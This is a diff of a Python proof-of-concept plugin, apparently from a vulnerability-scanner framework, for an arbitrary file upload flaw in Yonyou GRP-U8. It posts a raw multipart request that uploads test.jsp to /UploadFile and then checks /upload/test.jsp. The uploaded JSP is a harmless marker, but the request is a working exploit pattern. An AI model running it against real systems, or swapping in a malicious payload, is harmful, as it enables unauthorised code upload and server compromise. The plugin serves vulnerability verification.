@@ -6,7 +6,7 @@ import time
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'yongyou_0026' # 平台漏洞编号，留空
+    vuln_id = 'Yonyou_0026' # 平台漏洞编号，留空
     name = '用友 GRP-u8系统任意文件上传' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.FILE_UPLOAD # 漏洞类型
@@ -17,7 +17,7 @@ class Vuln(ABVuln):
     ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0111406' # 漏洞来源
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown' #cve编号
-    product = '用友'  # 漏洞应用名称
+    product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 
@@ -35,24 +35,23 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             raw='''POST /UploadFile HTTP/1.1
-                Host: 210.44.112.101
-                Content-Length: 227
-                Cache-Control: max-age=0
-                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-                Origin: null
-                Upgrade-Insecure-Requests: 1
-                User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
-                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVg9Q1fvRBAApMhqx
-                Accept-Encoding: gzip, deflate
-                Accept-Language: zh-CN,zh;q=0.8
+Host: 210.44.112.101
+Content-Length: 227
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: null
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVg9Q1fvRBAApMhqx
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
 
-                ------WebKitFormBoundaryVg9Q1fvRBAApMhqx
-                Content-Disposition: form-data; name="rfile_name"; filename="test.jsp"
-                Content-Type: application/octet-stream
+------WebKitFormBoundaryVg9Q1fvRBAApMhqx
+Content-Disposition: form-data; name="rfile_name"; filename="test.jsp"
+Content-Type: application/octet-stream
 
-                <% out.println("testvul");%>
-                ------WebKitFormBoundaryVg9Q1fvRBAApMhqx--
-                '''
+<% out.println("testvul");%>
+------WebKitFormBoundaryVg9Q1fvRBAApMhqx--'''
             code,head,res,errcode,finalurl=hh.http(arg+"UploadFile",raw=raw)
             verify_url=arg+"/upload/test.jsp"
             code,head,res,errcode,finalurl=hh.http(verify_url)
